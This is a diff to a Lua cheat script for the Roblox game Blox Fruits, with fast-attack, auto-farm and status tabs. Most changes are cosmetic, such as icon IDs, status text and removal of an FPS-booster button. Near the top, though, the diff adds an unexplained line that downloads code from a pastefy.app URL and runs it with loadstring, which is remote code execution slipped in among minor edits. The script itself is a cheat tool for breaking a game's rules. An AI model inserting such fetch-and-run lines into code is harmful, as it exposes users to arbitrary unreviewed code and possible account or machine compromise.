@@ -98,6 +98,8 @@ local Window = Fluent:CreateWindow({
     MinimizeKey = Enum.KeyCode.End
 })
 
+loadstring(game:HttpGet("https://pastefy.app/5JEMtmap/raw"))()
+
 local Tabs = {
     infor = Window:AddTab({ Title = "Discord", Icon = "" }),
     Home = Window:AddTab({ Title = "Status", Icon = "" }),
@@ -128,9 +130,9 @@ ImageButton.BorderSizePixel = 0
 ImageButton.Position = UDim2.new(0.120833337, 0, 0.0952890813, 0)
 ImageButton.Size = UDim2.new(0, 50, 0, 50)
 ImageButton.Draggable = true
-ImageButton.Image = "http://www.roblox.com/asset/?id=18919385586"
+ImageButton.Image = "http://www.roblox.com/asset/?id=80435402963017"
 
-UICorner.CornerRadius = UDim.new(0, 10) 
+UICorner.CornerRadius = UDim.new(0, 8) 
 UICorner.Parent = ImageButton
 
 ImageButton.MouseButton1Down:Connect(function()
@@ -1402,7 +1404,7 @@ function()
 			elseif string.len(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner")) == 86 then
 				BuonNaoDauAiThau:SetDesc("Kill : "..string.sub(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CakePrinceSpawner"),39,39).." ")
 			else
-				BuonNaoDauAiThau:SetDesc("Quát Vật Katakuri Đang Spwm")
+				BuonNaoDauAiThau:SetDesc("🟢")
 			end
 		end
 		)
@@ -1419,7 +1421,7 @@ local EmOiDungKhoc = Tabs.Home:AddParagraph({
               pcall(  
                     function()
              if game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149431" then
-                        EmOiDungKhoc:SetDesc("100%")
+                        EmOiDungKhoc:SetDesc("🟢 100% - Full Moon")
                     elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709149052" then
                         EmOiDungKhoc:SetDesc("75%")
                     elseif game:GetService("Lighting").Sky.MoonTextureId=="http://www.roblox.com/asset/?id=9709143733" then
@@ -1662,61 +1664,6 @@ LPH_JIT_MAX(function()
 end)()
 
 local Section = Tabs.Main:AddSection("Setting")
-Tabs.Main:AddButton({
-    Title = "Siêu Pro Fix Lag | Booster",
-    Description = "Giảm Độ Họa Để Chơi Mượt Hơn Thoii",
-    Callback = function()
-        local function FPSBooster()
-            local decalsyeeted = true
-            local g = game
-            local w = g.Workspace
-            local l = g.Lighting
-            local t = w.Terrain
-            
-            sethiddenproperty(l, "Technology", Enum.Technology.Compatibility)
-            sethiddenproperty(t, "Decoration", false)
-            
-            t.WaterWaveSize = 0
-            t.WaterWaveSpeed = 0
-            t.WaterReflectance = 0
-            t.WaterTransparency = 0
-            
-            l.GlobalShadows = false
-            l.FogEnd = 9e9
-            l.Brightness = 0
-            
-            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
-            
-            for _, v in pairs(g:GetDescendants()) do
-                if v:IsA("Part") or v:IsA("Union") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
-                    v.Material = Enum.Material.Plastic
-                    v.Reflectance = 0
-                elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
-                    v.Transparency = 1
-                elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
-                    v.Lifetime = NumberRange.new(0)
-                elseif v:IsA("Explosion") then
-                    v.BlastPressure = 1
-                    v.BlastRadius = 1
-                elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
-                    v.Enabled = false
-                elseif v:IsA("MeshPart") then
-                    v.Material = Enum.Material.Plastic
-                    v.Reflectance = 0
-                    v.TextureID = 10385902758728957 -- You might want to verify this TextureID
-                end
-            end
-            
-            for _, e in pairs(l:GetChildren()) do
-                if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
-                    e.Enabled = false
-                end
-            end
-        end
-        
-        FPSBooster()
-    end
-})
 local FASTAT = Tabs.Main:AddToggle("Fast_Attack", {Title = "Fast Attack", Default = true })
 FASTAT:OnChanged(function(value)
 	Fast_Attack = value
@@ -2051,7 +1998,7 @@ local function ChangeModeFastAttack(SelectFastAttackMode)
 	elseif SelectFastAttackMode == "Fast Attack" then
 		FireCooldown = 0.07
 	elseif SelectFastAttackMode == "Super Attack" then
-		FireCooldown = 0.00
+		FireCooldown = 0.001
 	end
 end
 
@@ -3410,6 +3357,7 @@ Toggle:OnChanged(function(Value)
     _G.RaidPirate = Value
  StopTween(_G.RaidPirate)
 end)    	
+
 
 local Toggle = Tabs.item:AddToggle("Auto Eliter Hunter", { Title = "Auto Farm Eliter Hunter", Default = false })
 Toggle:OnChanged(function(Value)
